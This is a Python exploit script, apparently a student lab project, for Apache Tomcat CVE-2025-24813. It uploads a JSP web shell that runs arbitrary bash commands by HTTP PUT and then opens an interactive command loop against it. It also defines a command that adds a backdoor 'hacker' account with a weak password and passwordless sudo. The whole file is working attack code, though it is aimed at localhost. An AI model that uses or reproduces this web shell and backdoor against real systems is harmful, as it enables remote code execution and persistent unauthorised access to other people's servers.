#!/usr/bin/env python3
import requests
import urllib.parse
import os, time, sys
from colorama import Fore, Style, init, Back

os.system("clear")

init()

shell_name = f"shell.jsp"

JSP_PAYLOAD = """<%@page import="java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
        out.println(line);
    }
}
%>"""

add_user = """sudo useradd -m -s /bin/bash -G sudo hacker && echo "hacker:12345" | sudo chpasswd && echo "hacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers"""
remove_user = """sudo deluser --remove-home hacker"""

def print_banner():
    filenames = []
    frames = []
    for i in range(1, 11):
        filenames.append(f'ascii_art/animation{i}.txt')

    for name in filenames:
        with open(name, "r", encoding="utf-8") as f:
            frames.append(f.read())

    end_time = time.time() + 3
    while time.time() < end_time:
        for frame in frames:
            sys.stdout.write('\033[2J\033[H')
            sys.stdout.write(banner + frame)
            sys.stdout.flush()
            time.sleep(0.3)



CYAN = Fore.CYAN + Style.BRIGHT
RED = Fore.RED + Style.BRIGHT
RESET = Style.RESET_ALL

text = "By: Mitchell Zhou, Yunna Wang, Jeet Vijaywargi"
banner = f"""

   ██████╗  ███████╗ ███╗   ██╗     █████╗  ██╗  █████╗
  ██╔════╝  ██╔════╝ ████╗  ██║    ██╔══██╗ ██║ ██╔══██╗
  ██║  ███╗ █████╗   ██╔██╗ ██║    ███████║ ██║ ███████║
  ██║   ██║ ██╔══╝   ██║╚██╗██║    ██╔══██║ ██║ ██╔══██║
  ╚██████╔╝ ███████╗ ██║ ╚████║    ██║  ██║ ██║ ██║  ██║
   ╚═════╝  ╚══════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝ ╚═╝ ╚═╝  ╚═╝
╔═══════════════════════════════════════════════════════╗
║{RED} Applied Information Assurance {RESET}| {CYAN}Tomcat_CVE-2025-24813{RESET} ║
╚═══════════════════════════════════════════════════════╝
   🕵️ {text} 👮
"""

def upload_shell(target):
    shell_url = f"{target.rstrip('/')}/upload/{shell_name}"

    try:
        response = requests.put(
            shell_url,
            headers={"Content-Type": "text/plain"},
            data=JSP_PAYLOAD,
            timeout=10
        )

        if response.status_code in [200, 201, 204]:
            print(f"[+] Shell uploaded to: {shell_url}")
            return True
        print(f"[-] Upload failed (HTTP {response.status_code})")
    except Exception as e:
        print(f"[-] Upload error: {e}")
    return None


def execute_command(shell_url, command):
    try:
        response = requests.get(
            f"{shell_url}?cmd={urllib.parse.quote(command)}",
            timeout=8
        )
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"[-] Execution error: {e}")
    return None


def main():
    print_banner()
    target = "http://127.0.0.1:8080/Rito"

    # Upload shell
    if not upload_shell(target):
        return

    shell_url = target + "/" + shell_name

    # Test command execution
    print("\nEnter commands to execute (or 'exit' to quit):")
    while True:
        cmd = input("$ ")
        if cmd.lower() in ['exit', 'quit']:
            break
        if not cmd.strip():
            continue

        result = execute_command(shell_url, cmd)
        print(result if result else "[No output]")


if __name__ == "__main__":
    main()
